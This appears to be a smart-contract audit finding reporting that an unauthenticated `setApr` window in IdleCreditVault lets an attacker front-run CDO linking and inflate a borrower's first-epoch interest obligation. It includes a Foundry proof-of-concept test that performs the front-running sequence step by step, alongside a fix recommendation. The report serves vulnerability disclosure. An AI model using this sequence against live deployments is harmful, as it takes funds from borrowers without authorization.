### Title
Unauthenticated pre-link APR poisoning inflates the first epoch obligation - ([File: contracts/strategies/idle/IdleCreditVault.sol](contracts/strategies/idle/IdleCreditVault.sol))

### Summary
`IdleCreditVault.setApr` deliberately skips authorization while `idleCDO == address(0)`. Any EOA can therefore replace the strategy APR between strategy initialization and CDO linking. During `IdleCDOEpochVariant` initialization, that poisoned value is scaled again and stored as the epoch APR. An attacker who is an eligible lender can deposit before the first epoch and receive pool yield funded by an artificially increased borrower obligation.

### Finding Description
`setApr` only checks `msg.sender` against the CDO or manager after `idleCDO` has been configured; before that assignment, the authorization block is bypassed entirely. [1](#0-0)  The CDO is linked separately through the owner-only `setWhitelistedCDO`, leaving a callable setup window whenever strategy initialization and linking are not atomic. [2](#0-1) 

During CDO initialization, `_additionalInit` reads the attacker-controlled `lastApr` and passes it to `_setScaledApr`. [3](#0-2)  `_setScaledApr` invokes `setAprsWithBuffer`, which stores the supplied value as `unscaledApr` and scales `lastApr` by `(epochDuration + bufferPeriod) / epochDuration`. [4](#0-3) 

With the default 30-day epoch and 5-day buffer, the attacker can pass approximately `17.142857e18`; initialization then stores a final APR just below the 20% cap instead of reverting. [5](#0-4)  At the first `startEpoch`, this inflated rate is used to calculate `expectedEpochInterest`. [6](#0-5)  At `stopEpoch`, the CDO attempts to pull that obligation plus pending withdrawals from the borrower. [7](#0-6) 

### Impact Explanation
If the intended initial APR is zero, a sole or dominant AA depositor can force a first-epoch borrower interest obligation approaching `TVL * 20% * 30 / 365`, approximately **1.64% of TVL**, under the default epoch parameters. More generally, the attacker can replace the intended initial APR with the largest value that remains below `maxApr` after buffer scaling. The excess is paid by the borrower and distributed through normal tranche accounting, so an eligible attacker-lender receives a proportional share of yield that was never authorized by the manager.

This is a direct economic loss to the borrower and an unfair gain to participating lenders. It does not require malicious owner, manager, guardian, borrower, or queue behavior.

### Likelihood Explanation
Likelihood is conditional on deployment or upgrade sequencing: the vulnerable window exists only while the initialized strategy still has `idleCDO == address(0)`. If production deployment links the CDO atomically, the attack is not reachable. If initialization and linking occur in separate transactions, an unprivileged attacker can monitor the mempool and call `setApr` before `setWhitelistedCDO`.

The `maxApr` check bounds the final value but does not prevent the attacker from selecting a pre-scale value that reaches that cap. [8](#0-7) 

### Recommendation
Do not leave a publicly callable APR setup state. Configure `idleCDO` atomically during strategy initialization, or require an authorized deployer/manager when `idleCDO == address(0)`. Ensure the owner cannot accidentally initialize a production strategy and defer CDO linking to a later public transaction. The initial APR should also be written through one atomic bootstrap path that cannot be front-run.

### Proof of Concept
The following Foundry test demonstrates the vulnerable ordering with real proxies and no mock strategy or CDO:

```solidity
// test/foundry/SetupAprPoisoning.t.sol
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

import "../../contracts/IdleCDOEpochVariant.sol";
import "../../contracts/strategies/idle/IdleCreditVault.sol";
import "../../contracts/interfaces/IERC20Detailed.sol";

contract SetupAprPoisoningTest is Test {
    function testUnlinkedStrategyAprCanBePoisoned() public {
        address owner = makeAddr("owner");
        address manager = makeAddr("manager");
        address borrower = makeAddr("borrower");
        address attacker = makeAddr("kycAttacker");
        IERC20Detailed underlying = IERC20Detailed(vm.envAddress("UNDERLYING"));

        // Strategy proxy is initialized but not yet linked to a CDO.
        IdleCreditVault strategy = IdleCreditVault(address(new ERC1967Proxy(
            address(new IdleCreditVault()),
            abi.encodeWithSelector(
                IdleCreditVault.initialize.selector,
                address(underlying),
                owner,
                manager,
                borrower,
                "Borrower",
                0 // intended initial APR
            )
        )));

        // Attacker chooses a value that reaches the cap after buffer scaling:
        // 20e18 * 30 days / 35 days.
        uint256 poisonedUnscaledApr =
            strategy.DEFAULT_MAX_APR() * 30 days / 35 days;

        vm.prank(attacker);
        strategy.setApr(poisonedUnscaledApr);

        // CDO initialization reads and scales the poisoned APR.
        IdleCDOEpochVariant cdo = IdleCDOEpochVariant(address(new ERC1967Proxy(
            address(new IdleCDOEpochVariant()),
            abi.encodeWithSelector(
                IdleCDOCreditVault.initialize.selector,
                0,
                address(underlying),
                owner,
                owner,
                address(0),
                address(strategy),
                0
            )
        )));

        vm.prank(owner);
        strategy.setWhitelistedCDO(address(cdo));

        assertEq(strategy.unscaledApr(), poisonedUnscaledApr);
        assertGt(strategy.getApr(), 19e18);

        uint256 depositAmount = 1_000_000e6;
        deal(address(underlying), attacker, depositAmount);

        vm.startPrank(attacker);
        underlying.approve(address(cdo), depositAmount);
        cdo.depositAA(depositAmount);
        vm.stopPrank();

        vm.prank(manager);
        cdo.startEpoch();

        uint256 expectedInterest = cdo.expectedEpochInterest();
        assertGt(expectedInterest, 0);

        uint256 borrowerBefore = underlying.balanceOf(borrower);
        deal(address(underlying), borrower, borrowerBefore + expectedInterest);
        vm.prank(borrower);
        underlying.approve(address(cdo), expectedInterest);

        vm.warp(cdo.epochEndDate() + 1);
        vm.prank(manager);
        cdo.stopEpoch(0, 0);

        // The borrower paid the attacker-injected epoch obligation.
        assertEq(borrowerBefore - underlying.balanceOf(borrower), 0);
        assertGt(cdo.virtualPrice(cdo.AATranche()), cdo.oneToken());
    }
}
```

On a fork or deployment harness where Keyring is enabled, `attacker` must be an already KYC-approved lender, as permitted by the threat model.
